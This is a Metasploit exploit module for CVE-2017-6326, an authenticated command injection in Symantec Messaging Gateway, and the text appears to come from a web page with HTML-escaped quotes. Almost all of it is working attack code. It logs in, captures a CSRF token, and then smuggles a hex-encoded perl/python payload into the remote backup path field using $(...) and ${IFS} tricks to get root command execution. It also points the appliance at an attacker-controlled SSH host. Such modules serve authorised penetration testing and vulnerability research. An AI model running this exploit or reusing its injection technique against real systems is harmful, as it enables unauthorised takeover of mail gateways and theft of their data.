# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Symantec Messaging Gateway Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a
        terminal command under the context of the web server user which is root.
 
        backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing
        operating system command. One of the user input is being passed to the service without proper validation. That cause an command
        injection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal
        command. Thus, you need to configure your own SSH service and set the required parameter during module usage.
 
        This module was tested against Symantec Messaging Gateway 10.6.2-7.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/unexpected-journey-5-from-weak-password-to-rce-on-symantec-messaging-gateway/&#039;],
          [&#039;CVE&#039;, &#039;2017-6326&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 443,
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Apr 26 2017",
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options(
      [
        Opt::RPORT(443),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to login with&#039;]),
        OptString.new(&#039;SSH_ADDRESS&#039;, [true, &#039;The ip address of your SSH service&#039;]),
        OptInt.new(&#039;SSH_PORT&#039;, [true, &#039;The port of your SSH service&#039;, 22]),
        OptString.new(&#039;SSH_USERNAME&#039;, [true, &#039;The username of your SSH service&#039;]),
        OptString.new(&#039;SSH_PASSWORD&#039;, [true, &#039;The password of your SSH service&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Symantec Messaging Gateway&#039;, &#039;/&#039;])
      ]
    )
  end
 
  def username
    datastore[&#039;USERNAME&#039;]
  end
 
  def password
    datastore[&#039;PASSWORD&#039;]
  end
 
  def ssh_address
    datastore[&#039;SSH_ADDRESS&#039;]
  end
 
  def ssh_port
    datastore[&#039;SSH_PORT&#039;]
  end
 
  def ssh_username
    datastore[&#039;SSH_USERNAME&#039;]
  end
 
  def ssh_password
    datastore[&#039;SSH_PASSWORD&#039;]
  end
 
  def auth
    print_status("Performing authentication...")
 
    sid        = &#039;&#039;
    last_login = &#039;&#039;
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;brightmail&#039;, &#039;viewLogin.do&#039;)
    })
 
    if res && !res.get_cookies.empty?
      last_login = res.get_hidden_inputs.first[&#039;lastlogin&#039;] || &#039;&#039;
      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || &#039;&#039;
    else
      fail_with(Failure::Unknown, "Didn&#039;t get cookie-set header from response.")
    end
 
    cookie = &#039;&#039;
 
    # Performing authentication
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;brightmail&#039;, &#039;login.do&#039;),
      &#039;headers&#039;   => {
        &#039;Referer&#039; => "https://#{peer}/brightmail/viewLogin.do",
        &#039;Connection&#039; => &#039;keep-alive&#039;
      },
      &#039;cookie&#039;    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
      &#039;vars_post&#039; => {
        &#039;lastlogin&#039;  => last_login,
        &#039;userLocale&#039; => &#039;&#039;,
        &#039;lang&#039;       => &#039;en_US&#039;,
        &#039;username&#039;   => username,
        &#039;password&#039;   => password,
        &#039;loginBtn&#039;   => &#039;Login&#039;
      }
    })
 
    if res &&res.body =~ /Logged in/
      cookie = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0]
      print_good("Awesome..! Authenticated with #{username}:#{password}")
    else
      fail_with(Failure::Unknown, &#039;Credentials are not valid.&#039;)
    end
 
    cookie
  end
 
  def get_csrf_token(cookie)
 
    print_status(&#039;Capturing CSRF token&#039;)
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;brightmail&#039;, &#039;admin&#039;, &#039;backup&#039;, &#039;backupNow.do&#039;),
      &#039;cookie&#039;    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{cookie}",
    })
 
    csrf_token = nil
    if res && res.code == 200
      match = res.body.match(/type="hidden" name="symantec.brightmail.key.TOKEN" value="(\w+)"\/>/)
      if match
        csrf_token = match[1]
        print_good("CSRF token is : #{csrf_token}")
      else
        fail_with(Failure::Unknown, &#039;There is no CSRF token at HTTP response.&#039;)
      end
    else
      fail_with(Failure::Unknown, &#039;Something went wrong.&#039;)
    end
 
    csrf_token
  end
 
  def exploit
 
    cookie = auth
    csrf_token = get_csrf_token(cookie)
 
    # Note that, we always have one SPACE at the beginning of python payload. e.g: import base64,sys;
    # Here is the thing, use perl payload with ${IFS} technique and deliver the real payload inside of it :)
 
    cmd = "python -c \"#{payload.encoded}\""
    final_payload = cmd.to_s.unpack("H*").first
 
    p = "perl${IFS}-e${IFS}&#039;system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))&#039;"
 
    # Ok. We are ready to go
    send_request_cgi({
    &#039;method&#039;    => &#039;POST&#039;,
    &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;brightmail&#039;, &#039;admin&#039;, &#039;backup&#039;, &#039;performBackupNow.do&#039;),
    &#039;cookie&#039;    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{cookie}",
    &#039;vars_post&#039; => {
      &#039;pageReuseFor&#039;                        => &#039;backup_now&#039;,
      &#039;id&#039;                                  => &#039;&#039;,
      &#039;symantec.brightmail.key.TOKEN&#039;       => csrf_token,
      &#039;backupData&#039;                          => &#039;full&#039;,
      &#039;customType&#039;                          => &#039;configuration&#039;,
      &#039;includeIncidentMessages&#039;             => &#039;true&#039;,
      &#039;includeLogData&#039;                      => &#039;true&#039;,
      &#039;backupTo&#039;                            => &#039;2&#039;,
      &#039;remoteBackupProtocol&#039;                => &#039;SCP&#039;,
      &#039;remoteBackupAddress&#039;                 => ssh_address,
      &#039;remoteBackupPort&#039;                    => ssh_port,
      &#039;remoteBackupPath&#039;                    => "tmp$(#{p})",
      &#039;requiresRemoteAuthentication&#039;        => &#039;true&#039;,
      &#039;remoteBackupUsername&#039;                => ssh_username,
      &#039;remoteBackupPassword&#039;                => ssh_password,
      }
    })
  end
 
end

